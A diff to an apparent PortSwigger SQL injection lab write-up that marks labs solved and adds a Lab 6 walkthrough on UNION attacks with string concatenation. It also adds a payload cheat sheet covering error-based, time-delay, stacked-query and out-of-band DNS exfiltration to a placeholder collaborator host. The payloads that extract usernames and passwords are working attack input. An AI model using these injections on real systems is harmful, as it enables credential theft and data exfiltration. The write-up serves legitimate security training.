@@ -3,6 +3,7 @@
 
 <p align="center">
   <b>🔍 Portswigger SQLi Labs</b><br>
+  <b>Status :🧾 Ongoing</b>
   <i>Lab: SQL Injection vulnerability</i>
 </p>
 
@@ -17,6 +18,7 @@
 
 <p align="center">
   <b>Lab: SQL Injection Vulnerability allows retriving hidden data</b><br>
+  <b>Status : ✅ Solved</b>
   <i>Target: display unreleased products via SQL Injection.</i>
 </p>
 
@@ -97,6 +99,7 @@ SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 
 <p align="center">
   <b>Lab: SQL Injection Vulnerability Allowing Login Bypass</b><br>
+  <b>Status : ✅ Solved</b>
   <i>Target: Login as <code>administrator</code> by bypassing authentication via SQL Injection.</i>
 </p>
 
@@ -172,6 +175,7 @@ Here:
 
 <p align="center">
   <b>Lab: SQL injection UNION attack, determining the number of columns returned by the query</b><br>
+  <b>Status : ✅ Solved</b>
   <i>Target: determine number of columns via SQLi + UNION attack.</i>
 </p>
 
@@ -250,6 +254,7 @@ When the ORDER BY number exceeds the actual column count, an error will be shown
 
 <p align="center">
   <b>Lab: SQL injection UNION attack to find a column that supports text</b><br>
+  <b>Status : ✅ Solved</b>
   <i>Target: Identify a column that supports string data to leak usernames and passwords.</i>
 </p>
 
@@ -313,6 +318,7 @@ On Oracle: Use FROM DUAL if required.
 
 <p align="center">
   <b>Lab: SQL injection UNION attack, retrieving data from other tables</b><br>
+  <b>Status : ✅ Solved</b>
   <i>Target: Exfiltrate usernames and passwords from the <code>users</code> table via UNION-based SQL injection.</i>
 </p>
 
@@ -367,7 +373,162 @@ Use the credentials you retrieved to log in as the administrator through the pro
 
 ## ✅ Lab Status
 ✔️ Completed – Successfully exploited SQLi to extract user data and logged in as the administrator.
+---
 
+<h2 align="center">💻 Lab 6 - SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column</h2>
+
+<p align="center">
+  <b>Lab: SQL injection UNION attack, retrieving multiple values in a single column</b><br>
+  <b>Status : ✅ Solved</b>
+  <i>Target: Extract usernames and passwords from the `users` table using a UNION attack with string concatenation.</i>
+</p>
+
+## 🧠 Lab Context
+This lab contains a SQL injection vulnerability in the product category filter. The response from the query is shown in the application, allowing you to perform a UNION-based SQL injection to retrieve data from another table: `users`, which contains the columns `username` and `password`.
+---
+
+## 🎯 Goal
+✅ Retrieve all usernames and passwords and log in as the `administrator` user.
+---
+
+## 🧠 Strategy & Execution
+### 🔹 Step 1: Intercept & Modify the Request
+Use Burp Suite to intercept the request that sets the product category filter.
+
+### 🔹 Step 2: Determine Column Count & Type
+Verify the number of columns and which accept text:
+```
+'+UNION+SELECT+NULL,'abc'--
+```
+✅ Confirms 2 columns exist and only one accepts text.
+
+### 🔹 Step 3: Retrieve User Data with Concatenation
+Use the Oracle string concatenation operator `||` to retrieve both username and password in one text-compatible column:
+```
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+
+✅ This displays data like:
+```
+administrator~s3cure
+wiener~peter
+carlos~montoya
+```
+
+---
+
+## 🧩 Injection Cheat Sheet
+### 🔸 String Concatenation
+
+| DBMS           | Syntax                                         |   |         |
+| -------------- | ---------------------------------------------- | - | ------- |
+| **Oracle**     | \`'foo'                                        |   | 'bar'\` |
+| **Microsoft**  | `'foo' + 'bar'`                                |   |         |
+| **PostgreSQL** | \`'foo'                                        |   | 'bar'\` |
+| **MySQL**      | `'foo' 'bar'` (space) or `CONCAT('foo','bar')` |   |         |
+
+### 🔸 Substring Extraction
+
+| DBMS       | Syntax                      |
+| ---------- | --------------------------- |
+| Oracle     | `SUBSTR('foobar', 4, 2)`    |
+| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
+| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
+| MySQL      | `SUBSTRING('foobar', 4, 2)` |
+
+### 🔸 Comments
+
+| DBMS       | Syntax                                  |
+| ---------- | --------------------------------------- |
+| Oracle     | `--comment`, `/*comment*/`              |
+| Microsoft  | `--comment`, `/*comment*/`              |
+| PostgreSQL | `--comment`, `/*comment*/`              |
+| MySQL      | `#comment`, `-- comment`, `/*comment*/` |
+
+### 🔸 Get DB Version
+
+| DBMS       | Query                          |
+| ---------- | ------------------------------ |
+| Oracle     | `SELECT banner FROM v$version` |
+| Microsoft  | `SELECT @@version`             |
+| PostgreSQL | `SELECT version()`             |
+| MySQL      | `SELECT @@version`             |
+
+### 🔸 List Tables & Columns
+
+| DBMS       | List Tables                               | List Columns                                                               |
+| ---------- | ----------------------------------------- | -------------------------------------------------------------------------- |
+| Oracle     | `SELECT * FROM all_tables`                | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'`            |
+| Microsoft  | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
+| PostgreSQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
+| MySQL      | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
+
+### 🔸 Trigger Errors (Boolean Test)
+
+| DBMS       | Query                                                                      |
+| ---------- | -------------------------------------------------------------------------- |
+| Oracle     | `SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`        |
+| Microsoft  | `SELECT CASE WHEN (cond) THEN 1/0 ELSE NULL END`                           |
+| PostgreSQL | `1 = (SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE NULL END)`            |
+| MySQL      | `SELECT IF(cond, (SELECT table_name FROM information_schema.tables), 'a')` |
+
+### 🔸 Visible Errors (Extract Data)
+
+| DBMS       | Query Example                                                                 | Error Message Example                      |
+| ---------- | ----------------------------------------------------------------------------- | ------------------------------------------ |
+| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`                                    | Conversion failed for varchar 'secret'     |
+| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`                    | Invalid input syntax for integer: "secret" |
+| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` | XPATH syntax error: '\secret'              |
+
+### 🔸 Stacked Queries (Batch Execution)
+
+| DBMS       | Support      | Syntax Example   |
+| ---------- | ------------ | ---------------- |
+| Oracle     | ❌            | —                |
+| Microsoft  | ✅            | `QUERY1; QUERY2` |
+| PostgreSQL | ✅            | `QUERY1; QUERY2` |
+| MySQL      | ⚠️ Sometimes | `QUERY1; QUERY2` |
+
+### 🔸 Time Delays
+
+| DBMS       | Query                                 |
+| ---------- | ------------------------------------- |
+| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
+| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
+| PostgreSQL | `SELECT pg_sleep(10)`                 |
+| MySQL      | `SELECT SLEEP(10)`                    |
+
+### 🔸 Conditional Time Delays
+
+| DBMS       | Query Example                                                    |   |                                                                 |
+| ---------- | ---------------------------------------------------------------- | - | --------------------------------------------------------------- |
+| Oracle     | \`SELECT CASE WHEN (cond) THEN 'a'                               |   | dbms\_pipe.receive\_message(('a'),10) ELSE NULL END FROM dual\` |
+| Microsoft  | `IF (cond) WAITFOR DELAY '0:0:10'`                               |   |                                                                 |
+| PostgreSQL | `SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` |   |                                                                 |
+| MySQL      | `SELECT IF(cond, SLEEP(10), 'a')`                                |   |                                                                 |
+
+### 🔸 DNS Lookup (Out-of-Band)
+
+| DBMS       | Query Example                                                                                                                                          |
+| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual` |
+| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR/a'`                                                                                                      |
+| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'`                                                                                             |
+| MySQL      | `LOAD_FILE('\\BURP-COLLABORATOR\a')` or `SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR\a'`                                                              |
+
+### 🔸 DNS with Data Exfiltration
+
+| DBMS       | Payload Summary                                           |   |                  |
+| ---------- | --------------------------------------------------------- | - | ---------------- |
+| Oracle     | Use XML and `EXTRACTVALUE()` with \`                      |   | (SELECT query)\` |
+| Microsoft  | Build string with query, then execute `xp_dirtree`        |   |                  |
+| PostgreSQL | Create PL/pgSQL function to `nslookup` with injected data |   |                  |
+| MySQL      | `SELECT your-query INTO OUTFILE '\\BURP-COLLABORATOR\a'`  |   |                  |
+
+---
+
+## ✅ Lab Status
+> **Lab Completed** — Successfully performed SQLi using string concatenation to retrieve usernames and passwords and logged in as administrator.
 
 ------
 ### 📚 Learning Takeaways
